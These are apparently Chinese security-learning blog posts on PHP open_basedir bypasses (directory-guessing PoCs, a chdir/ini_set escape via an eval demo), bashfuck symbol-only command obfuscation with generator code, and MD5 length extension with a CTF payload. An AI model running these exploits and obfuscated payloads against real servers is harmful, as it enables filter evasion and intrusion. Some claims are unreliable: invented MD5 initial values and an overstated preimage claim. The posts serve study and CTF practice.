#\rRealpath函数是php中将一个路径规范化成为绝对路径的方法，它可以去掉多余的../或./等跳转字符，能将相对路径转换成绝对路径。 but，在开启了open_basedir以后，这个函数有个特点：当我们传入的路径是一个不存在的文件（目录）时，它将返回false；当我们传入一个不在open_basedir里的文件（目录）时，他将抛出错误（File is not within the allowed path(s)）。 所以就是利用这个特性进行猜解，考虑到效率问题，所以利用了Windows下的通配符\n\u0026lt;?php ini_set(\u0026#39;open_basedir\u0026#39;, dirname(__FILE__)); printf(\u0026#34;\u0026lt;b\u0026gt;open_basedir: %s\u0026lt;/b\u0026gt;\u0026lt;br /\u0026gt;\u0026#34;, ini_get(\u0026#39;open_basedir\u0026#39;)); //打印了当前open限制的目录 set_error_handler(\u0026#39;isexists\u0026#39;); $dir = \u0026#39;d:/test/\u0026#39;; $file = \u0026#39;\u0026#39;; $chars = \u0026#39;abcdefghijklmnopqrstuvwxyz0123456789_\u0026#39;; for ($i=0; $i \u0026lt; strlen($chars); $i++) { $file = $dir . $chars[$i] . \u0026#39;\u0026lt;\u0026gt;\u0026lt;\u0026#39;; realpath($file); } function isexists($errno, $errstr) { $regexp = \u0026#39;/File\\((.*)\\) is not within/\u0026#39;; preg_match($regexp, $errstr, $matches); if (isset($matches[1])) { printf(\u0026#34;%s \u0026lt;br/\u0026gt;\u0026#34;, $matches[1]); } } ?\u0026gt; 脚本可以列出D:/test/下的文件目录，当然这个只在Windows下适用在linux下面不适用 这里还有一个缺点就是不能列出来首字母相同的文件，所以我打算改进一下p神的脚本\n\u0026lt;?php // 设置 open_basedir 指令 ini_set(\u0026#39;open_basedir\u0026#39;, dirname(__FILE__)); // 打印 open_basedir 限制 echo \u0026#34;\u0026lt;b\u0026gt;open_basedir: \u0026#34; . ini_get(\u0026#39;open_basedir\u0026#39;) . \u0026#34;\u0026lt;/b\u0026gt;\u0026lt;br /\u0026gt;\u0026#34;; // 定义自定义错误处理程序 set_error_handler(\u0026#39;isexists\u0026#39;); // 目录和字符 $dir = \u0026#39;d:/test/\u0026#39;; $chars = \u0026#39;abcdefghijklmnopqrstuvwxyz0123456789_\u0026#39;; // 迭代字符 for ($i = 0; $i \u0026lt; strlen($chars); $i++) { $file = $dir . $chars[$i] . \u0026#39;\u0026lt;\u0026gt;\u0026#39;; if (file_exists($file)) { // 尝试访问文件 $realpath = realpath($file); if ($realpath === false) { // 文件无法访问 trigger_error(\u0026#34;File $file is not within allowed directories.\u0026#34;, E_USER_WARNING); } } // 如果下一个字符的首字母与当前字符的首字母相同，则跳过 while ($i \u0026lt; strlen($chars) - 1 \u0026amp;\u0026amp; $chars[$i] == $chars[$i + 1]) { $i++; } } // 自定义错误处理程序函数 function isexists($errno, $errstr) { $regexp = \u0026#39;/File\\((.*)\\) is not within/\u0026#39;; if (preg_match($regexp, $errstr, $matches)) { echo \u0026#34;{$matches[1]}\u0026lt;br /\u0026gt;\u0026#34;; } } ?\u0026gt; 利用SplFileInfo::getRealPath()列举目录 #\rSplFileInfo类是PHP5.1.2之后引入的一个类，提供一个对文件进行操作的接口。其中有一个和realpath名字很像的方法叫getRealPath。\n这个方法功能和realpath类似，都是获取绝对路径用的。我们在SplFileInfo的构造函数中传入文件相对路径，并且调用getRealPath即可获取文件的绝对路径。\n这个方法有个特点：完全没有考虑open_basedir。在传入的路径为一个不存在的路径时，会返回false；在传入的路径为一个存在的路径时，会正常返回绝对路径。 所以不像realpath需要考虑是否在open_basedir下面的条件\nP神POC\n\u0026lt;?php ini_set(\u0026#39;open_basedir\u0026#39;, dirname(__FILE__)); printf(\u0026#34;\u0026lt;b\u0026gt;open_basedir: %s\u0026lt;/b\u0026gt;\u0026lt;br /\u0026gt;\u0026#34;, ini_get(\u0026#39;open_basedir\u0026#39;)); $basedir = \u0026#39;D:/test/\u0026#39;; $arr = array(); $chars = \u0026#39;abcdefghijklmnopqrstuvwxyz0123456789\u0026#39;; for ($i=0; $i \u0026lt; strlen($chars); $i++) { $info = new SplFileInfo($basedir . $chars[$i] . \u0026#39;\u0026lt;\u0026gt;\u0026lt;\u0026#39;); $re = $info-\u0026gt;getRealPath(); if ($re) { dump($re); } } function dump($s){ echo $s . \u0026#39;\u0026lt;br/\u0026gt;\u0026#39;; ob_flush(); flush(); } ?\u0026gt; 利用chdir与ini_set #\r首先解释一下ini_set https://www.php.net/manual/zh/function.ini-set 这里先放一下demo network师傅的\n\u0026lt;?php echo \u0026#39;open_basedir: \u0026#39;.ini_get(\u0026#39;open_basedir\u0026#39;).\u0026#39;\u0026lt;br\u0026gt;\u0026#39;; echo \u0026#39;GET: \u0026#39;.$_GET[\u0026#39;c\u0026#39;].\u0026#39;\u0026lt;br\u0026gt;\u0026#39;; eval($_GET[\u0026#39;c\u0026#39;]); echo \u0026#39;open_basedir: \u0026#39;.ini_get(\u0026#39;open_basedir\u0026#39;); ?\u0026gt; EXP:\nmkdir(\u0026#39;sub\u0026#39;);chdir(\u0026#39;sub\u0026#39;);ini_set(\u0026#39;open_basedir\u0026#39;,\u0026#39;..\u0026#39;);chdir(\u0026#39;..\u0026#39;);chdir(\u0026#39;..\u0026#39;);chdir(\u0026#39;..\u0026#39;);chdir(\u0026#39;..\u0026#39;);ini_set(\u0026#39;open_basedir\u0026#39;,\u0026#39;/\u0026#39;);var_dump(scandir(\u0026#39;/\u0026#39;)); 一些分析： https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/ 好吧我实在是看不下去底层了\u0026hellip;还是功底不够..还得练\nGD库imageftbbox/imagefttext #\r看了一下其实和前面的realpath一样都是通过一些报错来进行猜解 当文件存在，则php会抛出“File(xxxxx) is not within the allowed path(s)”错误。但当文件不存在的时候会抛出“Invalid font filename”错误。\nPOC：\n\u0026lt;?php ini_set(\u0026#39;open_basedir\u0026#39;, dirname(__FILE__)); printf(\u0026#34;\u0026lt;b\u0026gt;open_basedir: %s\u0026lt;/b\u0026gt;\u0026lt;br /\u0026gt;\u0026#34;, ini_get(\u0026#39;open_basedir\u0026#39;)); set_error_handler(\u0026#39;isexists\u0026#39;); $dir = \u0026#39;d:/test/\u0026#39;; $file = \u0026#39;\u0026#39;; $chars = \u0026#39;abcdefghijklmnopqrstuvwxyz0123456789_\u0026#39;; for ($i=0; $i \u0026lt; strlen($chars); $i++) { $file = $dir . $chars[$i] . \u0026#39;\u0026lt;\u0026gt;\u0026lt;\u0026#39;; //$m = imagecreatefrompng(\u0026#34;zip.png\u0026#34;); //imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, \u0026#39;aaa\u0026#39;); imageftbbox(100, 100, $file, \u0026#39;aaa\u0026#39;); } function isexists($errno, $errstr) { global $file; if (stripos($errstr, \u0026#39;Invalid font filename\u0026#39;) === FALSE) { printf(\u0026#34;%s\u0026lt;br/\u0026gt;\u0026#34;, $file); } } ?\u0026gt; bindtextdomain暴力执法 #\remm原理还是一样但是鸡肋，因为Windows下面默认没有这个函数\u0026amp;\u0026amp;linux下面是不能使用通配符进行绕过所以如果上面的方法都没有用才会考虑这些猜解的问题\n\u0026lt;?php printf(\u0026#39;\u0026lt;b\u0026gt;open_basedir: %s\u0026lt;/b\u0026gt;\u0026lt;br /\u0026gt;\u0026#39;, ini_get(\u0026#39;open_basedir\u0026#39;)); $re = bindtextdomain(\u0026#39;xxx\u0026#39;, $_GET[\u0026#39;dir\u0026#39;]); var_dump($re); ?\u0026gt; reference #\r1、 https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.htm 2、 https://xz.aliyun.com/t/10070?time__1311=mq%2BxBD9QDQe4RDBkPoGkYL5AKeGIhxqGOjeD 3、 https://www.v0n.top/2020/07/10/open_basedir%e7%bb%95%e8%bf%87/ 4、 https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/\n","date":"14 April 2024","externalUrl":null,"permalink":"/posts/open_basedir%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/","section":"Posts","summary":"","title":"Open_basedir绕过","type":"posts"},{"content":"","date":"14 April 2024","externalUrl":null,"permalink":"/tags/php/","section":"Tags","summary":"","title":"PHP","type":"tags"},{"content":"","date":"14 April 2024","externalUrl":null,"permalink":"/tags/rce/","section":"Tags","summary":"","title":"RCE","type":"tags"},{"content":"","date":"14 April 2024","externalUrl":null,"permalink":"/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","section":"Tags","summary":"","title":"文件包含","type":"tags"},{"content":"0x0e前言 #\r本来是在CTF刷刷题目，然后有个知识点不太明白所以就去找着了lazy师傅问了一下，结果发了一个bashfuck的知识点过来（x，本来一个简单的绕过却有了新的思路，索性来记录一下。\n#注意：因为debian、Ubuntu系统的sh软连接是到dash的，centos的sh软链接连接到bash，但是kali的zsh不是很兼容dash所以IFS就解析不了，还是直接用空格代替即可\n0x01common_oct #\r这个就是最常规的可以用十六进制，或者八进制来执行命令\nsum_data = \u0026#39;\u0026#39; str1 = input(\u0026#34;请输入要转化的命令:\u0026#34;) str1 = str1.strip() # 去除首尾空格 data_len = len(str1) # 判断总长度来循环 for i in range(data_len): data = ord(str1[i]) if data == ord(\u0026#39; \u0026#39;): # 检查空格字符 sum_data += \u0026#34;\u0026#39;$IFS$\u0026#39;\u0026#34; else: data_8 = oct(data)[2:] final_data = \u0026#39;\\\\\u0026#39; + data_8 sum_data += final_data print(\u0026#34;common_oct\u0026#34;) print(\u0026#34;$\u0026#39;\u0026#34; + sum_data + \u0026#34;\u0026#39;\u0026#34;) 出来直接使用即可，在kali里面的ifs直接用空格代替即可 example：\n$\u0026#39;\\154\\163\u0026#39; #= ls 0x02bashfuck_x #\r运用到的原理就是算术拓展$(())，这个的返回值为0，并且可以有这种用法$((1\u0026lt;\u0026lt;1)#2binary)来构造出一些命令 还是拿ls来举例子，如果不去利用二进制来构造可以这么写\n\u0026#34;$\u0026#34;\u0026#39;\u0026#39;\\\u0026#39;\u0026#39;\\\u0026#39;$(($((1))54))\u0026#39;\\\u0026#39;$(($((1))63))\\\u0026#39; 构造出来就是common_oct的写法 然后这里也可以使用二进制来构造\n$\\\u0026#39;\\\\$(($((1\u0026lt;\u0026lt;1))#10011010))\\\\$(($((1\u0026lt;\u0026lt;1))#10100011))\\\u0026#39; 因为相对于前面的你构造出54啊或者是其他数字比较麻烦，而在探姬师傅的wiki下面说明了几种可以表示0和1的方法，所以用01来代替能利用py快速的得出结果并且可以实现无数字来打 一些对应：\n\u0026gt;echo ${#} \u0026gt;0 \u0026gt;echo ${##} \u0026gt;1 \u0026gt;echo ${#_} \u0026gt;1 \u0026gt;echo ${_} \u0026gt;1 \u0026gt;echo ${?} \u0026gt;0 \u0026gt;echo ${?#} \u0026gt;1 等等都可以用来构造 下面附上相关函数\ndef bashfuck_x(cmd, form): bash_str = \u0026#39;\u0026#39; for c in cmd: bash_str += f\u0026#39;\\\\\\\\$(($((1\u0026lt;\u0026lt;1))#{bin(int(get_oct(c)))[2:]}))\u0026#39; payload_bit = bash_str payload_zero = bash_str.replace(\u0026#39;1\u0026#39;, \u0026#39;${##}\u0026#39;) # 用 ${##} 来替换 1 payload_c = bash_str.replace(\u0026#39;1\u0026#39;, \u0026#39;${##}\u0026#39;).replace(\u0026#39;0\u0026#39;, \u0026#39;${#}\u0026#39;) # 用 ${#} 来替换 0 if form == \u0026#39;bit\u0026#39;: payload_bit = \u0026#39;$0\u0026lt;\u0026lt;\u0026lt;$0\\\\\u0026lt;\\\\\u0026lt;\\\\\u0026lt;\\\\$\\\\\\\u0026#39;\u0026#39; + payload_bit + \u0026#39;\\\\\\\u0026#39;\u0026#39; return info(payload_bit) elif form == \u0026#39;zero\u0026#39;: payload_zero = \u0026#39;$0\u0026lt;\u0026lt;\u0026lt;$0\\\\\u0026lt;\\\\\u0026lt;\\\\\u0026lt;\\\\$\\\\\\\u0026#39;\u0026#39; + payload_zero + \u0026#39;\\\\\\\u0026#39;\u0026#39; return info(payload_zero) elif form == \u0026#39;c\u0026#39;: payload_c = \u0026#39;${!#}\u0026lt;\u0026lt;\u0026lt;${!#}\\\\\u0026lt;\\\\\u0026lt;\\\\\u0026lt;\\\\$\\\\\\\u0026#39;\u0026#39; + payload_c + \u0026#39;\\\\\\\u0026#39;\u0026#39; return info(payload_c) 然后这里需要解决一个问题，你会发现你直接执行命令是没办法执行的，这里探姬师傅也是给出了相关的连接 https://www.gnu.org/software/bash/manual/html_node/Shell-Expansions.html 总的来说就是扩展顺序，我们在八进制转义的时候已经扩展了一次，所以后面不会再次解析 所以这里就用标准输出来完成解析\n/bin/bash\u0026lt;\u0026lt;\u0026lt; 所以最后的playload的前面要加上:$0\u0026lt;\u0026lt;\u0026lt; $0 可以表示当前脚本的文件名，在终端中，$0其实就是bash本身。\n0x03bashfuck_y #\r这里和上面的都差不多只是对-1的取反进行了利用\noct_list = [ # 构造数字 0-7 以便于后续八进制形式的构造 \u0026#39;$(())\u0026#39;, # 0 \u0026#39;$((~$(($((~$(())))$((~$(())))))))\u0026#39;, # 1 \u0026#39;$((~$(($((~$(())))$((~$(())))$((~$(())))))))\u0026#39;, # 2 \u0026#39;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\u0026#39;, # 3 \u0026#39;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\u0026#39;, # 4 \u0026#39;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\u0026#39;, # 5 \u0026#39;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\u0026#39;, # 6 \u0026#39;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\u0026#39;, # 7 ] 这样就可以使用$(())去构造$'\\xxx\\xxx\\xxx\\xxx'\n再引入我们前面提到的，变量赋值，我们就可以轻松的用$(())拿到sh\nbashFuck = \u0026#39;\u0026#39; bashFuck += \u0026#39;__=$(())\u0026#39; # set __ to 0 bashFuck += \u0026#39;\u0026amp;\u0026amp;\u0026#39; # splicing bashFuck += \u0026#39;${!__}\u0026lt;\u0026lt;\u0026lt;${!__}\\\\\u0026lt;\\\\\u0026lt;\\\\\u0026lt;\\\\$\\\\\\\u0026#39;\u0026#39; # got \u0026#39;sh\u0026#39; # bashFuck = __=$(())\u0026amp;\u0026amp;${!__}\u0026lt;\u0026lt;\u0026lt;${!__}\\\\\u0026lt;\\\\\u0026lt;\\\\\u0026lt;\\\\$\\\\\\\u0026#39; 得到我们第四种playload:\nCommand:ls Charset : ! $ \u0026amp; \u0026#39; ( ) \u0026lt; = \\ _ { } ~ Total Used: 13 Total length = 393 Payload = __=$(())\u0026amp;\u0026amp;${!__}\u0026lt;\u0026lt;\u0026lt;${!__}\\\u0026lt;\\\u0026lt;\\\u0026lt;\\$\\\u0026#39;\\\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\\u0026#39; 参考文章： https://github.com/ProbiusOfficial/bashFuck?tab=readme-ov-file\n","date":"14 April 2024","externalUrl":null,"permalink":"/posts/%E6%B5%85%E8%B0%88bashfuck/","section":"Posts","summary":"","title":"浅谈BashFuck","type":"posts"},{"content":"0x00前言 #\r因为kengwang师傅在新生赛出了这个题目，但是之前没学过www，这就来学学。\n0x01 什么是hash长度拓展攻击 #\rhash长度拓展攻击，概括一下就是由于hash的生成机制使得我们可以人为的在原先的明文基础上添加新的拓展字符，从而使得原本的加密链变长，进一步控制加密链的最后一节，使得我们得以控制最终的结果。\n这里简单介绍一下hash算法。\nhash算法 #\rhash算法又叫做散列算法。是一种把任意长度的字符串加密为固定长度的字符串的加密算法，该算法生成的密文就是散列值。这里拿一个比较典型的MD5来做例子来详细分析一下\n0X02MD5加密 #\rMD5 introduction #\rMD5 消息摘要算法是一种广泛使用的哈希函数，可生成 128位哈希值。 MD5 由Ronald Rivest于 1991年设计，用于取代早期的哈希函数MD4 ，并于 1992 年被指定为 RFC 1321。\nMD5 可用作校验和来验证数据完整性，防止意外损坏。历史上它被广泛用作加密哈希函数；然而，它被发现存在广泛的漏洞。它仍然适用于其他非加密目的，例如用于确定分区数据库中特定密钥的分区，并且由于比最新的安全散列算法更低的计算要求，它可能是首选。\nMD5 proccess #\r这里我将MD5加密分为三个步骤，分别是：\n填充 分块 多轮压缩 最后输出，这里我一一举例 填充 #\r这里我贴一下墨师傅的脚本\ndef text_to_binary(text_str): binary_str = \u0026#39; \u0026#39;.join(format(ord(x), \u0026#39;b\u0026#39;) for x in text_str) return binary_str text_input = \u0026#39;0123456789abcdef\u0026#39; binary_output = text_to_binary(text_input) print(\u0026#39;binary result is:{0}\u0026#39;.format(binary_output)) 具体的代码逻辑应该很清晰\ninput是0-f 将input转换为2进制内容 这里的输出为 00110000 00110001 00110010 00110011 00110100 00110101 00110110 00110111 00111000 00111001 01100001 01100010 01100011 01100100 01100101 01100110 这里便是128位的二进制字符 或者我们可以用010来查看文件，这里举例 这里就是9*8=72个二进制字符\n填充的rule #\r什么叫填充呢，填充的过程就是讲2进制字符个数填充到512比特的整数倍大小，并且需要在最后面预留64位来固定表示原始数据大小，即小端在前格式，中间剩下的比特第一个填1其余的补0\n那么对于以上的两个二进制文件，则就可以按照这个填充规则来进行填充。\n疑问？ #\r这里提出一个小问题，如果说你输入的数据刚好为512bit呢，那么他是否会进行填充，答案是肯定的，因为没有最后64位固定值来表示原始数据大小，那么就会填充到1024-512=512个数据（当然包含进最后64位固定数据）。 包括在最后不足64位时也需要补齐到下一个512整数倍的数据。 最后补的64位的值就是前面数据长度的大小，例如abcd，则就是4*8=32，转化成二进制就是100000。\n分块 #\r那么在前面进行填充后肯定可以进行分块，并且分块肯定可以是512的整数倍。 并且这个时候会给出四组幻数来作为md5的初始值 例如 0x1a8ba2ba 0x18s62abs 0x17ais27a2 0x1a662b1a\n多轮压缩 #\r过程：把当前的四组散列值各复制一份，分别用abcd来表示 然后在每一个数据块中进行四轮操作，其中包含与，或，非，和循环位移操作，每次把abcd更新四次。 所以每个大块都可以对abcd的值进行更新16次。\n这里我贴一个java实现md5加密的脚本\nimport java.security.MessageDigest; import java.security.NoSuchAlgorithmException; public class MD5 { public static void main(String[] args) { String input = \u0026#34;Hello, World!\u0026#34;; String encrypted = encryptToMD5(input); System.out.println(\u0026#34;Original String: \u0026#34; + input); System.out.println(\u0026#34;MD5 Encrypted String: \u0026#34; + encrypted); } public static String encryptToMD5(String input) { try { MessageDigest md = MessageDigest.getInstance(\u0026#34;MD5\u0026#34;); md.update(input.getBytes()); byte[] digest = md.digest(); StringBuilder sb = new StringBuilder(); for (byte b : digest) { sb.append(String.format(\u0026#34;%02x\u0026#34;, b \u0026amp; 0xff)); } return sb.toString(); } catch (NoSuchAlgorithmException e) { e.printStackTrace(); return null; } } } MD5攻击 #\r第一原像攻击（First Preimage Attack） #\r第一原像攻击的目标是从给定的哈希值ℎh中找到相应的消息m，使得当这个消息被输入到哈希函数（例如MD5）时，会产生给定的哈希值ℎ。\n在MD5的上下文中，虽然找到第一原像的理论复杂度是O(2^128)（由于MD5生成128位的哈希值），但是由于MD5的安全性问题，实际上的攻击复杂度远低于理论值。例如，研究已经显示，使用现代硬件和算法，可以在几小时或几天内找到MD5的第一原像。\n第二原像攻击（Second Preimage Attack） #\r第二原像攻击的目标是对于给定的输入消息m1​，找到另一个不同的消息m2​，使得两个消息产生相同的哈希值。这意味着对于哈希值ℎ，存在两个不同的消息m1​和m2​满足：\nMD5(m1​)=MD5(m2​)=h 同样，理论上，第二原像攻击的复杂度是O(2^128)，但由于MD5的弱点，实际攻击的复杂度比理论值低得多。尽管如此，相对于第一原像攻击，第二原像攻击仍然是一个更为困难的问题。\n碰撞攻击 #\r碰撞攻击是一种密码学攻击，目的是找到两个不同的输入消息（也称为原文），这两个消息在经过同一哈希函数计算后，会产生相同的哈希值。换句话说，攻击者试图找到两个不同的消息 m1​ 和 m2​，使得：\nhash(m1​)=hash(m2​)\n在MD5的上下文中，由于MD5哈希值为128位，理论上的碰撞攻击复杂度为O(2^128)。然而，由于MD5的设计缺陷和计算上的优化，现实中的碰撞攻击比这个理论复杂度要低得多。\nexample #\r2004年，Xiaoyun Wang等人发布了一个研究，成功地找到了两个不同的PDF文件，这两个文件在经过MD5哈希后产生了相同的哈希值。这是MD5碰撞攻击的早期和最著名的例子。\n具体来说，这项研究找到了两个PDF文件：一个是普通的合同文件，另一个是恶意的PDF文件，其中嵌入了攻击代码。当这两个文件经过MD5哈希后，它们产生了相同的128位哈希值。这意味着，对于MD5哈希值来说，这两个文件是不可区分的，尽管它们的内容截然不同。\n这个例子揭示了MD5在实际应用中的严重安全风险。如果攻击者能够找到一个合法文件和一个恶意文件，这两个文件的MD5哈希值相同，那么攻击者就可以轻易地伪装合法文件，诱使用户打开恶意文件，从而进行恶意攻击。\n由于MD5的这种弱点，现在强烈建议避免使用MD5进行任何安全相关的应用，而应选择更安全的哈希算法，如SHA-256或SHA-3。这些算法在当前时间（2022年1月之前）被认为是安全的，并且不容易受到碰撞攻击的威胁。\nHash 长度拓展攻击 #\r可能我现在写的东西有点抽象，不过后面我会总结讲一下为什么要这么做以及他的原理 这里定义一些东西\nlet secret = \u0026quot;secret\u0026quot; let data = \u0026quot;data\u0026quot; let H = md5() let signature = hash(secret || data) = 6036708eba0d11f6ef52ad44e8b74d5b let append = \u0026quot;append\u0026quot; 首先这里放出一个简单的example\n0000 73 65 63 72 65 74 64 61 74 61 80 00 00 00 00 00 secretdata...... 0010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0030 00 00 00 00 00 00 00 00 50 00 00 00 00 00 00 00 ........P....... 代码模式可能看的不是很清晰，这里我贴出来图片 当然这里是利用16进制来表示的，我们用二进制也是可以的，8-\u0026gt;1，5-\u0026gt;8bit。\nATTACK #\r这里我们将一个值，就是前面的append加入到字符串中，是这样的 此时，这个哈希值有两种计算方式（破题点，这个后面会好好解释一下可能这里比较抽象）\n通过将其粘贴在缓冲区中并执行H(buffer) 从第一个块的末尾开始，使用我们已经知道的状态signature，并append从该状态开始进行散列 对于一种（也是在服务器端的计算过程） #\r其实就是按照正常的生成hash值的过程，最后生成出来的哈希值请我们这里暂定为： 6ee582a1669ce442f3719c47430dadee 这里贴出一下生成其md5的一个脚本\necho \u0026#39; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;openssl/md5.h\u0026gt; int main(int argc, const char *argv[]) { MD5_CTX c; unsigned char buffer[MD5_DIGEST_LENGTH]; int i; MD5_Init(\u0026amp;c); MD5_Update(\u0026amp;c, \u0026#34;secret\u0026#34;, 6); MD5_Update(\u0026amp;c, \u0026#34;data\u0026#34; \u0026#34;\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34; \u0026#34;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34; \u0026#34;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34; \u0026#34;\\x00\\x00\\x00\\x00\u0026#34; \u0026#34;\\x50\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34; \u0026#34;append\u0026#34;, 64); MD5_Final(buffer, \u0026amp;c); for (i = 0; i \u0026lt; 16; i++) { printf(\u0026#34;%02x\u0026#34;, buffer[i]); } printf(\u0026#34;\\n\u0026#34;); return 0; }\u0026#39; \u0026gt; hash_extension_1.c gcc -o hash_extension_1 hash_extension_1.c -lssl -lcrypto ./hash_extension_1 可以看到这里的签名就是我们之前的数据。\n第二种（也就是攻击者） #\r这里我直接贴脚本出来\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;openssl/md5.h\u0026gt; int main(int argc, const char *argv[]) { int i; unsigned char buffer[MD5_DIGEST_LENGTH]; MD5_CTX c; MD5_Init(\u0026amp;c); MD5_Update(\u0026amp;c, \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34;, 64); c.A = htonl(0x6036708e); /* \u0026lt;-- This is the hash we already had */ c.B = htonl(0xba0d11f6); c.C = htonl(0xef52ad44); c.D = htonl(0xe8b74d5b); MD5_Update(\u0026amp;c, \u0026#34;append\u0026#34;, 6); /* This is the appended data. */ MD5_Final(buffer, \u0026amp;c); for (i = 0; i \u0026lt; 16; i++) { printf(\u0026#34;%02x\u0026#34;, buffer[i]); } printf(\u0026#34;\\n\u0026#34;); return 0; }\u0026#39; \u0026gt; hash_extension_2.c gcc -o hash_extension_2 hash_extension_2.c -lssl -lcrypto ./hash_extension_2 可以看见我们这里对四个幻数（前面的理论有讲到），作为了一个初始参数 let signature = hash(secret || data) = 6036708eba0d11f6ef52ad44e8b74d5b 来进行md5值的加密，其实就是利用了AAAA那群数据块对其进行了再次的多轮压缩环节。 最后生成出来的哈希值 6ee582a1669ce442f3719c47430dadee\n其实到此为止，这个攻击就完成了。但是这里要说一下，放在理论上是比较难理解的，这里还是需要举例子可以更加直观的理解（其实在题目中的本质就是将最后面的多轮压缩再对你可控的append进行一次压缩从而你可以知道后面生成的MD5值是什么）\nDEMO1 #\r\u0026lt;?php error_reporting(0); $flag=getenv(\u0026#34;DASFLAG\u0026#34;); if(isset($_GET[\u0026#34;md5\u0026#34;]) \u0026amp;\u0026amp; isset($_GET[\u0026#34;i\u0026#34;]) \u0026amp;\u0026amp; isset($_GET[\u0026#34;s\u0026#34;])){ $fl4g = substr_replace($flag, $_GET[\u0026#34;s\u0026#34;], $_GET[\u0026#34;i\u0026#34;], 1); if($_GET[\u0026#34;md5\u0026#34;] === md5($fl4g)){ echo $flag; }else{ die(\u0026#34;please try again\u0026#34;); } }else{ highlight_file(__FILE__); echo md5($flag.\u0026#34;yusa\u0026#34;); } 1c3de59d2f68788cc792e0eb7d604710 这里直接放出playload： ?md5=d9671633e3723203bc2a1479c8412307\u0026amp;i=-1\u0026amp;s=}yusa%80%00%00%00%00%00%00%00%00%00%00%00%00%00%50%01%00%00%00%00%00%00a 这里我利用前面的的讲的ATTACK来进行讲解:\n例如我们的flag值是DT{axsak1dlsajl1} 那么此时的16进制就是这样的 然后在加了salt之后就是加入yusa后就是 此时的原始数据长度就是21*8=168bit，转化为16进制就是a8 填充后就是这样 那么进行多轮压缩的时候就是将其作为一个数据块进行压缩。 这里我直接贴出来md5值为： 2b604a43f439b6e02c09dece6a83e503 这个是我们已知的，后面用\n\\[YZ\\]表示\n构造 #\r这个时候我们就可以构造一下我们的playload什么的了 我们看到题目 $fl4g = substr_replace($flag, $_GET[\u0026quot;s\u0026quot;], $_GET[\u0026quot;i\u0026quot;], 1); 是对原本的flag进行了替换，那么此时我们可以想想，因为这个题目只能替换掉一个长度，那么对于定义，在前面的数据块中我们已经知道了其md5值，那么我们可以替换后添加到下一个数据块让他再次进行压缩，这个时候我们就知道他的下一个构造出来的md5是什么了 过程： 这个是完整的一个数据块，那么此时我们如果替换完后把他变为 这样之后那么是不是在服务端就会再次对其进行填充和多轮压缩，也就是这样 （这里的A7是我随便写的，因为懒得算前面的长度再转换了） 这里此时是不是第二个分块压缩就会利用包含a在的数据块再次对数据进行压缩，此时生成出来的md5值就和我们需要的md5值便一样了， 这里随便举一个例子：我们生成的md5是d9671633e3723203bc2a1479c8412307 那么显而易见，在服务端生成的md5值也就一定是这个也就绕过了 $_GET[\u0026quot;md5\u0026quot;] === md5($fl4g)的限制了\ndemo1小总结 #\r总的来说，我们可以很容易的看出来，其实就是我们可以构造出和原本数据一样的数据块之后自己补到下一个数据块内容来进行获得md5的加密值,也就是将我们的YZ放到上面ATTACK-\u0026gt;第二种下面的脚本来进行获得md5值的过程\n这个demo1后面再放出一个py脚本\n# -*- coding: utf-8 -*- # @Author: King kaki # @Date: 2018-08-04 12:40:11 # @Last Modified by: kingkk # @Last Modified time: 2018-08-12 15:08:28 import math F = lambda x, y, z: ((x \u0026amp; y) | ((~x) \u0026amp; z)) G = lambda x, y, z: ((x \u0026amp; z) | (y \u0026amp; (~z))) H = lambda x, y, z: (x ^ y ^ z) I = lambda x, y, z: (y ^ (x | (~z))) L = lambda x, n: (((x \u0026lt;\u0026lt; n) | (x \u0026gt;\u0026gt; (32 - n))) \u0026amp; (0xffffffff)) shi_1 = (7, 12, 17, 22) * 4 shi_2 = (5, 9, 14, 20) * 4 shi_3 = (4, 11, 16, 23) * 4 shi_4 = (6, 10, 15, 21) * 4 m_1 = (0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15) m_2 = (1, 6, 11, 0, 5, 10, 15, 4, 9, 14, 3, 8, 13, 2, 7, 12) m_3 = (5, 8, 11, 14, 1, 4, 7, 10, 13, 0, 3, 6, 9, 12, 15, 2) m_4 = (0, 7, 14, 5, 12, 3, 10, 1, 8, 15, 6, 13, 4, 11, 2, 9) def T(i): return (int(4294967296 * abs(math.sin(i)))) \u0026amp; 0xffffffff def shift(shift_list): shift_list = [shift_list[3], shift_list[0], shift_list[1], shift_list[2]] return shift_list def fun(fun_list, f, m, shi): count = 0 global Ti_count while count 